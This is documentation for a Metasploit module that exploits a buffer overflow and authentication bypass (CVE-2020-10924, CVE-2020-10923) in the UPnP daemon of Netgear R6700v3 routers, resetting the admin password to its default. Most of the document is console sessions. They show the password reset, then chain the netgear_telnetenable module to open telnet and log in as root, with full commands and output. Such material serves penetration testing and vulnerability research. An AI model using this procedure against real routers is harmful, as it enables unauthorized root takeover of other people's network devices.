## Vulnerable Application

This module targets ZDI-20-704 (aka CVE-2020-10924), a buffer overflow vulnerability in the UPNP daemon (/usr/sbin/upnpd),
on Netgear R6700v3 routers running firmware versions from V1.0.2.62 up to but not including V1.0.4.94, to reset
the password for the 'admin' user back to its factory default of 'password'. Authentication is bypassed by
using ZDI-20-703 (aka CVE-2020-10923), an authentication bypass that occurs when network adjacent
computers send SOAPAction UPnP messages to a vulnerable Netgear R6700v3 router. Currently this module only
supports exploiting Netgear R6700v3 routers running either the V1.0.0.4.82_10.0.57 or V1.0.0.4.84_10.0.58
firmware, however support for other firmware versions may be added in the future.

Once the password has been reset, attackers can use the exploit/linux/telnet/netgear_telnetenable module to send a
special packet to port 23/udp of the router to enable a telnet server on port 23/tcp. The attacker can
then log into this telnet server using the new password, and obtain a shell as the "root" user.

These last two steps have to be done manually, as the authors did not reverse the communication with the web interface.
It should be noted that successful exploitation will result in the upnpd binary crashing on the target router.
As the upnpd binary will not restart until the router is rebooted, this means that attackers can only exploit
this vulnerability once per reboot of the router.

This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +
Radek Domanski).

The vulnerable firmware versions this exploit supports can be downloaded from the following links:
* [Netgear R6700v3 firmware version V1.0.4.82_10.0.57](https://web.archive.org/web/20200630213752if_/https://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.82_10.0.57.zip)
* [Netgear R6700v3 firmware version V1.0.4.84_10.0.58](https://web.archive.org/web/20200630213830if_/https://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.84_10.0.58.zip)

## Verification Steps

  1. Connect the R6700v3 router to your local area network and ensure you can access it.
  2. Browse to the admin portal for the router, which will be located by default at `http://192.168.1.1`.
  3. Go to Advanced -> Administration -> Set Password
  4. Change the password from `password` to another password of your choice.
  5. Log out and browse again to `http://192.168.1.1`. Verify that you can log into the router with the new password.
  6. Start msfconsole
  7. Do: ```use auxiliary/admin/http/netgear_r6700_pass_reset```
  8. Set RHOST
  9. Run ```check``` and verify that the target is vulnerable.
  10. Do: ```run```
  11. Browse admin portal for the router, and
  verify you can successfully log in with the username `admin` and the password `password`.

## Options

### RHOSTS

IP address of the LAN interface of the vulnerable target.

### RPORT

upnpd port on the target. Default 5000.

## Scenarios

### Netgear R6700v3 firmware version V1.0.4.84_10.0.58

```
    msf5 > use auxiliary/admin/http/netgear_r6700_pass_reset
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
    
    Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT    5000             yes       The target port (TCP)
       SSL      false            no        Negotiate SSL/TLS for outgoing connections
       VHOST                     no        HTTP server virtual host
    
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
    RHOSTS => 192.168.1.1
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check
    
    [*] Target is running firmware version 1.0.4.84
    [*] 192.168.1.1:5000 - The target appears to be vulnerable.
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
    [*] Running module against 192.168.1.1
    
    [*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.
    [+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
    [*] To achieve code execution, do the following steps manually:
    [*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
    [*]     1.1- go to Advanced -> Administration -> Set Password
    [*]     1.2- Change the password from 'password' to <WHATEVER>
    [*] 2- Run metasploit as root, then:
    [*]     2.1- use exploit/linux/telnet/netgear_telnetenable
    [*]     2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
    [*]     2.3- set rhost 192.168.1.1
    [*]     2.3- set username admin
    [*]     2.4- set password <WHATEVER>
    [*]     2.5- OPTIONAL: set timeout 1500
    [*]     2.6- OPTIONAL: set MAC <ROUTERS_MAC>
    [*]     2.7- run it and login with 'admin:<WHATEVER>'
    [*] 3- Enjoy your root shell!
    [*] Auxiliary module execution completed
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) >
```

Browsed to admin page and changed password to `testing123`, then in a new `msfconsole`
session running as `root`, entered the following commands:

```
    msf5 > use exploit/linux/telnet/netgear_telnetenable
    [*] No payload configured, defaulting to cmd/unix/interact
    msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
    username => admin
    msf5 exploit(linux/telnet/netgear_telnetenable) > set password testing123
    password => testing123
    msf5 exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
    MAC => D56C89FC94C9
    msf5 exploit(linux/telnet/netgear_telnetenable) > set RHOSTS 192.168.1.1
    RHOSTS => 192.168.1.1
    msf5 exploit(linux/telnet/netgear_telnetenable) > exploit
    
    [+] 192.168.1.1:23 - Detected telnetenabled on UDP
    [+] 192.168.1.1:23 - Using creds admin:testing123
    [*] 192.168.1.1:23 - Generating magic packet
    [*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
    [*] 192.168.1.1:23 - Sending magic packet
    [*] 192.168.1.1:23 - Disconnecting from telnetenabled
    [*] 192.168.1.1:23 - Waiting for telnetd
    [*] 192.168.1.1:23 - Connecting to telnetd
    [*] Found shell.
    [*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.1:23) at 2020-06-30 15:57:33 -0500
    
    
    
    Login incorrect
     login: admin
    admin
    Password: testing123
    
    
    
    BusyBox v1.7.2 (2019-10-19 12:12:12 CST) built-in shell (ash)
    Enter 'help' for a list of built-in commands.
    
    # id
    id
    uid=0(admin) gid=0(root)
    # uname -a
    uname -a
    Linux R6700v3 2.6.36.4brcmarm+ #17 SMP PREEMPT Sat Oct 19 11:17:27 CST 2019 armv7l unknown
    #
```

### Netgear R6700v3 firmware version V1.0.0.4.82_10.0.57

```
    msf5 > use auxiliary/admin/http/netgear_r6700_pass_reset
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > show options
    
    Module options (auxiliary/admin/http/netgear_r6700_pass_reset):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT    5000             yes       The target port (TCP)
       SSL      false            no        Negotiate SSL/TLS for outgoing connections
       VHOST                     no        HTTP server virtual host
    
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOSTS 192.168.1.1
    RHOSTS => 192.168.1.1
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check
    
    [*] Target is running firmware version 1.0.4.82
    [*] 192.168.1.1:5000 - The target appears to be vulnerable.
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > exploit
    [*] Running module against 192.168.1.1
    
    [*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.
    [+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
    [*] To achieve code execution, do the following steps manually:
    [*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
    [*]     1.1- go to Advanced -> Administration -> Set Password
    [*]     1.2- Change the password from 'password' to <WHATEVER>
    [*] 2- Run metasploit as root, then:
    [*]     2.1- use exploit/linux/telnet/netgear_telnetenable
    [*]     2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
    [*]     2.3- set rhost 192.168.1.1
    [*]     2.3- set username admin
    [*]     2.4- set password <WHATEVER>
    [*]     2.5- OPTIONAL: set timeout 1500
    [*]     2.6- OPTIONAL: set MAC <ROUTERS_MAC>
    [*]     2.7- run it and login with 'admin:<WHATEVER>'
    [*] 3- Enjoy your root shell!
    [*] Auxiliary module execution completed
    msf5 auxiliary(admin/http/netgear_r6700_pass_reset) >
```

Browsed to admin page and changed password to `testing123`, then in a new `msfconsole`
session running as `root`, entered the following commands:

```
    msf5 > use exploit/linux/telnet/netgear_telnetenable
    [*] No payload configured, defaulting to cmd/unix/interact
    msf5 exploit(linux/telnet/netgear_telnetenable) > show options
    
    Module options (exploit/linux/telnet/netgear_telnetenable):
    
       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       FILTER                      no        The filter string for capturing traffic
       INTERFACE                   no        The name of the interface
       MAC                         no        MAC address of device
       PASSWORD                    no        Password on device
       PCAPFILE                    no        The name of the PCAP capture file to process
       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT      23               yes       The target port (TCP)
       SNAPLEN    65535            yes       The number of bytes to capture
       TIMEOUT    500              yes       The number of seconds to wait for new data
       USERNAME                    no        Username on device
    
    
    Payload options (cmd/unix/interact):
    
       Name  Current Setting  Required  Description
       ----  ---------------  --------  -----------
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic (detect TCP or UDP)
    
    
    msf5 exploit(linux/telnet/netgear_telnetenable) > set RHOST 192.168.1.1
    RHOST => 192.168.1.1
    set msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
    username => admin
    msf5 exploit(linux/telnet/netgear_telnetenable) > set password testing123
    password => testing123
    msf5 exploit(linux/telnet/netgear_telnetenable) > set MAC D56C89FC94C9
    MAC => D56C89FC94C9
    msf5 exploit(linux/telnet/netgear_telnetenable) > exploit
    
    [+] 192.168.1.1:23 - Detected telnetenabled on UDP
    [+] 192.168.1.1:23 - Using creds admin:testing123
    [*] 192.168.1.1:23 - Generating magic packet
    [*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
    [*] 192.168.1.1:23 - Sending magic packet
    [*] 192.168.1.1:23 - Disconnecting from telnetenabled
    [*] 192.168.1.1:23 - Waiting for telnetd
    [*] 192.168.1.1:23 - Connecting to telnetd
    [*] Found shell.
    [*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.1:23) at 2020-06-30 15:14:08 -0500
    
    
    
    Login incorrect
     login: admin
    admin
    Password: testing123
    
    
    
    BusyBox v1.7.2 (2019-07-29 20:56:07 CST) built-in shell (ash)
    Enter 'help' for a list of built-in commands.
    
    # id
    id
    uid=0(admin) gid=0(root)
    # uname -a
    uname -a
    Linux R6700v3 2.6.36.4brcmarm+ #17 SMP PREEMPT Mon Jul 29 19:43:55 CST 2019 armv7l unknown
    #
```
